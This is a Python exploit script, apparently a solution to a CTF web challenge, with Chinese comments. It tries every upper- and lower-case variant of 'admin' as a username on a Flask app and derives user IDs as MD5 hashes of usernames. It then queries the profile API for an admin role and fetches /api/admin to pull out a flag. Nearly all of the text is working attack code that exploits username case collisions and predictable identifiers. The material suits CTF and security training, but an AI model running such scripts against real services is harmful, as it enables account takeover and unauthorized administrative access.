import requests
import re
import hashlib
import itertools

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 所有大小写组合")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 所有 "admin" 的大小写组合
print("[*] 测试1: 所有 'admin' 的大小写组合")

# 生成所有大小写组合
letters = ['a', 'd', 'm', 'i', 'n']
combinations = []

for combination in itertools.product(['lower', 'upper'], repeat=5):
    username = ''
    for i, case in enumerate(combination):
        if case == 'lower':
            username += letters[i].lower()
        else:
            username += letters[i].upper()
    combinations.append(username)

# 移除 "admin" 和 "ADMIN"
combinations = [c for c in combinations if c not in ["admin", "ADMIN"]]

print(f"    [!] 生成了 {len(combinations)} 个组合")

# 测试每个组合
for username in combinations:
    print(f"    [-] 测试: {username}")
    
    # 检查是否已经注册
    resp = session.post(f"{BASE_URL}/register", data={"username": username})
    
    if resp.status_code == 200 and "UID" in resp.text:
        print(f"        [+] 新注册!")
        uid_match = re.search(r'[a-f0-9]{32}', resp.text)
        if uid_match:
            uid = uid_match.group()
            print(f"        UID: {uid}")
            
            # 检查角色
            profile_resp = session.post(f"{BASE_URL}/api/profile", 
                json={"uid": uid},
                headers={"Content-Type": "application/json"})
            print(f"        Role: {profile_resp.text}")
            
            if '"role":"admin"' in profile_resp.text:
                print(f"        [!!!] 找到管理员!")
                
                # 访问 /api/admin
                admin_resp = session.get(f"{BASE_URL}/api/admin")
                print(f"        GET /api/admin: {admin_resp.status_code}")
                print(f"        {admin_resp.text}")
                
                if "flag" in admin_resp.text.lower():
                    print(f"        [!!!] 发现 flag!")
                    flag_match = re.search(r'flag\{[^}]+\}', admin_resp.text, re.IGNORECASE)
                    if flag_match:
                        print(f"        [!!!] Flag: {flag_match.group()}")
                break
    elif resp.status_code == 400:
        # 已经注册，计算 UID 并检查
        uid = hashlib.md5(username.encode()).hexdigest()
        print(f"        [-] 已注册，检查 UID: {uid}")
        
        profile_resp = session.post(f"{BASE_URL}/api/profile", 
            json={"uid": uid},
            headers={"Content-Type": "application/json"})
        print(f"        Role: {profile_resp.text}")
        
        if '"role":"admin"' in profile_resp.text:
            print(f"        [!!!] 找到管理员!")
            break

print()

print("[*] 测试完成")
